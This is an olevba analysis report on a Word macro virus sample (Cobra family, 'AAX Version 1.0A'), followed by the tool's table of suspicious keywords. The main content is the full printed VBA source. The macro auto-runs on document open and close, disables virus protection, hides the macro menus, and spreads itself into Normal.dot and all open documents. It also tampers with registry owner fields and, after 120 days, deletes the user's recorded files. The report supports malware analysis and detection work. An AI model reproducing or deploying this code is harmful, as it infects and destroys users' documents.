olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.i-961834045deead8f63154c496bb528bcc701b3a8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.i-961834045deead8f63154c496bb528bcc701b3a8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAX_10A.bas 
in file: Virus.MSWord.Cobra.i-961834045deead8f63154c496bb528bcc701b3a8 - OLE stream: 'Macros/VBA/AAX_10A'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AAX Version 1.0A
'A intelligent member of Cobra family

Sub AutoClose()
Call MacToTemToDoc
End Sub
Sub AutoOpen()
Call MacToTemToDoc
End Sub
Sub FileNew()
Call MacToTemToDoc
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call MacToTemToDoc
WordBasic.FileExit
End Sub
Sub MacToTemToDoc()
On Error Resume Next
CustomizationContext = NormalTemplate
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
MacT = False
MacD = False
For Each MacrN In NormalTemplate.VBProject.VBComponents
If (MacrN.Name <> "ThisDocument" And MacrN.Name <> "AAX_10A" And Left(MacrN.Name, 5) <> "Cobra") Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=MacrN.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each MacrN In NormalTemplate.VBProject.VBComponents
If MacrN.Name = "AAX_10A" Then
MacT = True
End If
Next
If MacT = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="AAX_10A", _
Object:=wdOrganizerObjectProjectItems
End If
For Each DOC In Documents
For Each MacrN In DOC.VBProject.VBComponents
If (MacrN.Name <> "ThisDocument" And _
MacrN.Name <> "Reference to Normal" And MacrN.Name <> "AAX_10A") _
And Left(MacrN.Name, 5) <> "Cobra" Then
Application.OrganizerDelete Source:=DOC.FullName, _
Name:=MacrN.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
Next
For Each DOC In Documents
MacD = False
For Each MacrN In DOC.VBProject.VBComponents
If MacrN.Name = "AAX_10A" Then
MacD = True
End If
Next
If MacD = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=DOC.FullName, Name:="AAX_10A", _
Object:=wdOrganizerObjectProjectItems
End If
Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra ALIAS Liton" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra ALIAS Liton"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Shibrampur/Burichang/Comilla"
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "") = "" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "Inf") = Format(Date, "mm/dd/yyyy")
End If
FileFound = False
For i = 9 To 1 Step -1
FilName = "Doc" & i
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName) = ActiveDocument.FullName Then
FileFound = True
End If
Next
If FileFound = False Then
For i = 8 To 1 Step -1
FilName = "Doc" & i
GetList = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName)
If GetList <> "" Then
FilName = "Doc" & (i + 1)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName) = GetList
End If
Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", "Doc1") = ActiveDocument.FullName
End If
IDT = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "Inf")
CDT = Format(Date, "mm/dd/yyyy")
If DateValue(CDT) - DateValue(IDT) > 90 Then
MCF = False
For Each CM In ActiveDocument.VBProject.VBComponents
If CM.Name = "Cobra" Then
MCF = True
End If
Next
If MCF = False Then
Set AMod = ActiveDocument.VBProject.VBComponents.Add(vbext_ct_StdModule)
AMod.Name = "Cobra"
AModCode = "Sub FileOpen" + Chr(13) + _
"On Error Resume Next" + Chr(13) + _
"Dialogs(wdDialogFileOpen).Show " + Chr(13) + _
"ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate" + Chr(13) + _
"ActiveDocument.SaveAs FileName:=NormalTemplate.Path + ""\Cobra"", FileFormat:=wdFormatTemplate" + Chr(13) + _
"End Sub"
ActiveDocument.VBProject.VBComponents(AMod.Name).CodeModule.InsertLines 1, AModCode
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End If
If DateValue(CDT) - DateValue(IDT) > 120 Then
For i = 9 To 1 Step -1
FilName = "Doc" & i
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName) <> "" Then
Kill System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName) = ""
End If
Next
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

